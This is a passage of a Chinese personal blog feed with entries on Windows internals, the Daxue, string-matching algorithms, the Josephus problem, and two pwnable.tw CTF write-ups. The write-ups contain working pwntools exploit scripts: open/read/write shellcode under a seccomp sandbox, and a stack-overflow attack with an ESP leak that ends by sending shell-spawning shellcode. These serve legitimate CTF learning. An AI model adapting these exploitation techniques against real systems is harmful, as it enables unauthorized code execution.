        &lt;p&gt;Windows对象管理器的基本设计意图是：&lt;/p&gt;
&lt;p&gt;​    为执行体的数据结构提供一种统一而又可扩展的定义和控制机制。&lt;/p&gt;
&lt;p&gt;​    提供统一的安全访问机制。&lt;/p&gt;
&lt;p&gt;​    在无须修改已有系统代码的情况下，加入新的对象类型。&lt;/p&gt;
&lt;p&gt;​  
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Windows内核" scheme="http://yoursite.com/tags/Windows%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Writeup-of-pwnable.tw之orw</title>
    <link href="http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/"/>
    <id>http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/</id>
    <published>2020-03-21T04:52:46.000Z</published>
    <updated>2020-03-21T05:33:20.878Z</updated>
    
    <content type="html"><![CDATA[<p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p><p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p><p><img src="orw.png" alt=""></p><p>使用IDA Pro反汇编程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; &#x2F;&#x2F; starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure><p>可以得出整个程序的执行流程：</p><p>首先，在0x08048559地址处调用了orw_seccomp，那么这东西是干嘛的呢？</p><p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/#seccomp)">sseccomp</a></p><p>short for secure computing mode(<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">wiki</a>)是一种限制系统调用的安全机制，可以当沙箱用。在严格模式下只支持<code>exit()</code>，<code>sigreturn()</code>，<code>read()</code>和<code>write()</code>，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>查看</p><p>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用<code>seccomp_init</code>,<code>seccomp_rule_add</code>,<code>seccomp_load</code>来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有<code>CAP_SYS_ADMIN</code>权能，否则就要设置<code>PR_SET_NO_NEW_PRIVS</code>位，若不这样做非root用户使用这个程序时<code>seccomp</code>保护将会失效！设置了<code>PR_SET_NO_NEW_PRIVS</code>位后能保证<code>seccomp</code>对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行<code>execve</code>这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用<code>ptctl</code>也不能再把它禁用掉。</p><p>然后程序接下来将shellcode读到.bss段的0x804a060地址处，然后接下来直接使用call指令跳转到该处执行。</p><p>直接写shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./orw")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="string">"10001"</span>)</span><br><span class="line">ass = <span class="string">'''</span></span><br><span class="line"><span class="string"> xor eax, eax</span></span><br><span class="line"><span class="string"> push eax</span></span><br><span class="line"><span class="string"> push 0x6761</span></span><br><span class="line"><span class="string"> push 0x6c662f77</span></span><br><span class="line"><span class="string"> push 0x726f2f65</span></span><br><span class="line"><span class="string"> push 0x6d6f682f</span></span><br><span class="line"><span class="string"> mov al, 0x05</span></span><br><span class="line"><span class="string"> mov ebx, esp</span></span><br><span class="line"><span class="string"> xor ecx, ecx</span></span><br><span class="line"><span class="string"> int 0x80</span></span><br><span class="line"><span class="string"> sub esp, 0x40</span></span><br><span class="line"><span class="string"> mov ebx, eax</span></span><br><span class="line"><span class="string"> mov al, 0x03</span></span><br><span class="line"><span class="string"> mov ecx, esp</span></span><br><span class="line"><span class="string"> mov dl, 0x40</span></span><br><span class="line"><span class="string"> int 0x80</span></span><br><span class="line"><span class="string"> mov al, 0x04</span></span><br><span class="line"><span class="string"> mov bl, 0x01</span></span><br><span class="line"><span class="string"> mov ecx, esp</span></span><br><span class="line"><span class="string"> mov dl, 0x40</span></span><br><span class="line"><span class="string"> int 0x80</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">shellcode = asm(ass)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">s = p.recv(<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>后来看到网上有人写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./orw"</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line">io  = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">'/home/orw/flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"esp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"eax"</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line"><span class="comment">#print shellcode</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>觉得自己好憨啊。唉，学到了。原来pwntools真的是个神器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目显示Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.应该是使用了沙箱，&lt;/p&gt;
&lt;p&gt;后门程序是用不成了，只能使用这三个函数直接读取flag。了
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="seccomp" scheme="http://yoursite.com/tags/seccomp/"/>
    
  </entry>
  
  <entry>
    <title>Writeup of pwnable.tw之start</title>
    <link href="http://yoursite.com/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/"/>
    <id>http://yoursite.com/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/</id>
    <published>2020-03-20T11:44:15.000Z</published>
    <updated>2020-03-20T12:22:27.510Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：pwable.tw</p><p>使用checksec查看开启了哪些防护措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>使用objdump -d进行反汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:54                   push   %esp</span><br><span class="line"> 8048061:68 9d 80 04 08       push   $0x804809d</span><br><span class="line"> 8048066:31 c0                xor    %eax,%eax</span><br><span class="line"> 8048068:31 db                xor    %ebx,%ebx</span><br><span class="line"> 804806a:31 c9                xor    %ecx,%ecx</span><br><span class="line"> 804806c:31 d2                xor    %edx,%edx</span><br><span class="line"> 804806e:68 43 54 46 3a       push   $0x3a465443</span><br><span class="line"> 8048073:68 74 68 65 20       push   $0x20656874</span><br><span class="line"> 8048078:68 61 72 74 20       push   $0x20747261</span><br><span class="line"> 804807d:68 73 20 73 74       push   $0x74732073</span><br><span class="line"> 8048082:68 4c 65 74 27       push   $0x2774654c &#x2F;&#x2F;将要显示的字符串压栈</span><br><span class="line"> 8048087:89 e1                mov    %esp,%ecx</span><br><span class="line"> 8048089:b2 14                mov    $0x14,%dl</span><br><span class="line"> 804808b:b3 01                mov    $0x1,%bl</span><br><span class="line"> 804808d:b0 04                mov    $0x4,%al</span><br><span class="line"> 804808f:cd 80                int    $0x80</span><br><span class="line"> 8048091:31 db                xor    %ebx,%ebx</span><br><span class="line"> 8048093:b2 3c                mov    $0x3c,%dl</span><br><span class="line"> 8048095:b0 03                mov    $0x3,%al</span><br><span class="line"> 8048097:cd 80                int    $0x80</span><br><span class="line"> 8048099:83 c4 14             add    $0x14,%esp</span><br><span class="line"> 804809c:c3                   ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:5c                   pop    %esp</span><br><span class="line"> 804809e:31 c0                xor    %eax,%eax</span><br><span class="line"> 80480a0:40                   inc    %eax</span><br><span class="line"> 80480a1:cd 80                int    $0x80</span><br></pre></td></tr></table></figure><p>可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。</p><p>然后执行read(0, esp_address, 0x3c)；读入字符串。</p><p>可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：</p><p> 8048060:    54                       push   %esp</p><p>可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。</p><p>具体思路如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./start")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>)) <span class="comment">#返回到0x8048087处再执行write(1, esp_address, 0x14)</span></span><br><span class="line">s = p.recv(<span class="number">4</span>)  <span class="comment">#接收到esp的值</span></span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">'''mov al,0x03\n</span></span><br><span class="line"><span class="string">   sub esp,0x40\n</span></span><br><span class="line"><span class="string">   mov ecx,esp\n</span></span><br><span class="line"><span class="string">   mov dl,0x40\n</span></span><br><span class="line"><span class="string">   int 0x80\n</span></span><br><span class="line"><span class="string">   jmp esp'''</span>  <span class="comment">#直接跳到shellcode地址处</span></span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))<span class="comment">#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))<span class="comment">#读入shellcode，</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./start")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">s = p.recv(<span class="number">4</span>)</span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">'''mov al,0x03\n</span></span><br><span class="line"><span class="string">   sub esp,0x40\n</span></span><br><span class="line"><span class="string">   mov ecx,esp\n</span></span><br><span class="line"><span class="string">   mov dl,0x40\n</span></span><br><span class="line"><span class="string">   int 0x80\n</span></span><br><span class="line"><span class="string">   ret'''</span></span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(p32(address_esp+<span class="number">0x14</span>+<span class="number">0x04</span><span class="number">-0x40</span>)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目地址：pwable.tw&lt;/p&gt;
&lt;p&gt;使用checksec查看开启了哪些防护措施：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>读《大学》</title>
    <link href="http://yoursite.com/2020/03/16/%E8%AF%BB%E3%80%8A%E5%A4%A7%E5%AD%A6%E3%80%8B/"/>
    <id>http://yoursite.com/2020/03/16/%E8%AF%BB%E3%80%8A%E5%A4%A7%E5%AD%A6%E3%80%8B/</id>
    <published>2020-03-16T11:16:25.000Z</published>
    <updated>2020-03-16T13:26:57.212Z</updated>
    
    <content type="html"><![CDATA[<p>汤之《盘铭》曰：“苟日新，日日新，又日新。”《康诰》曰：“作新民。”《诗》曰：“周虽旧邦，其命维新。”是故君子无所不用其极。</p><p>每日更新自己，不间断。君子无处不追求最完善的境地。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;汤之《盘铭》曰：“苟日新，日日新，又日新。”《康诰》曰：“作新民。”《诗》曰：“周虽旧邦，其命维新。”是故君子无所不用其极。&lt;/p&gt;
&lt;p&gt;每日更新自己，不间断。君子无处不追求最完善的境地。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="随笔杂谈" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>模式匹配算法</title>
    <link href="http://yoursite.com/2020/03/16/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/"/>
    <id>http://yoursite.com/2020/03/16/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/</id>
    <published>2020-03-16T02:27:34.000Z</published>
    <updated>2020-03-16T08:34:19.478Z</updated>
    
    <content type="html"><![CDATA[<h6 id="一、朴素模式匹配算法"><a href="#一、朴素模式匹配算法" class="headerlink" title="一、朴素模式匹配算法"></a>一、朴素模式匹配算法</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回字串T在主串S中第pos个字符之后的位置。若不存在，则函数返回0；</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bf</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> S_length = S.length();</span><br><span class="line"><span class="keyword">int</span> T_length = T.length();</span><br><span class="line"><span class="keyword">while</span> (i &lt; S_length &amp;&amp; j &lt; T_length) &#123;</span><br><span class="line"><span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">i = i - j + <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T_length) &#123;</span><br><span class="line"><span class="keyword">return</span> i - T_length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="二、KMP模式匹配算法"><a href="#二、KMP模式匹配算法" class="headerlink" title="二、KMP模式匹配算法"></a>二、KMP模式匹配算法</h6><p>KMP(克努特-莫里斯-普拉特)</p><p>字串各个位的j值的变化定义为一个数组next:</p><p><img src="KMP.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过计算返回字串T的next数组。*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(<span class="built_in">string</span> T, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>, k=<span class="number">0</span>;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; T.length()<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">-1</span> || T[i] == T[k]) &#123;</span><br><span class="line">i++;</span><br><span class="line">k++;</span><br><span class="line">next[i] = k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">k = next[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> next[<span class="number">255</span>];</span><br><span class="line">get_next(T, next);</span><br><span class="line"><span class="keyword">int</span> S_len = S.length();</span><br><span class="line"><span class="keyword">int</span> T_len = T.length();</span><br><span class="line"><span class="keyword">while</span> (i &lt; S_len &amp;&amp; j &lt; T_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (j == <span class="number">-1</span> || S[i] == T[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">j = next[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T_len)</span><br><span class="line"><span class="keyword">return</span> i - T_len;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;一、朴素模式匹配算法&quot;&gt;&lt;a href=&quot;#一、朴素模式匹配算法&quot; class=&quot;headerlink&quot; title=&quot;一、朴素模式匹配算法&quot;&gt;&lt;/a&gt;一、朴素模式匹配算法&lt;/h6&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="模式匹配算法" scheme="http://yoursite.com/tags/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/"/>
    
      <category term="串" scheme="http://yoursite.com/tags/%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>Josephus</title>
    <link href="http://yoursite.com/2020/03/16/Josephus/"/>
    <id>http://yoursite.com/2020/03/16/Josephus/</id>
    <published>2020-03-16T02:17:39.058Z</published>
    <updated>2020-03-21T04:50:33.507Z</updated>
    
    <content type="html"><![CDATA[<p>约瑟夫问题是个有名的问题：N个人围成一圈，从第一个开始报数，第M个将被杀掉，最后剩下一个，其余人都将被杀掉。例如N=6，M=5，被杀掉的顺序是：5，4，6，2，3，1。</p><p>代码实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Joseph</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>]; <span class="comment">//开局每个人的编号</span></span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;  <span class="comment">//记录第k个出局的人</span></span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>;  <span class="comment">//出局人的当前位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">a[i] = i + <span class="number">1</span>; <span class="comment">//编号初始化，</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//循环T人</span></span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">1</span>)&#123;</span><br><span class="line">p = (p + m - <span class="number">1</span>) % n; <span class="comment">//关键点，计算出圈人的位置</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"第"</span> &lt;&lt; ++k &lt;&lt; <span class="string">"个出圈的是："</span> &lt;&lt; a[p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//重新排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = p + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">a[j - <span class="number">1</span>] = a[j]; </span><br><span class="line">        <span class="comment">//人数减一</span></span><br><span class="line">n--;</span><br><span class="line"><span 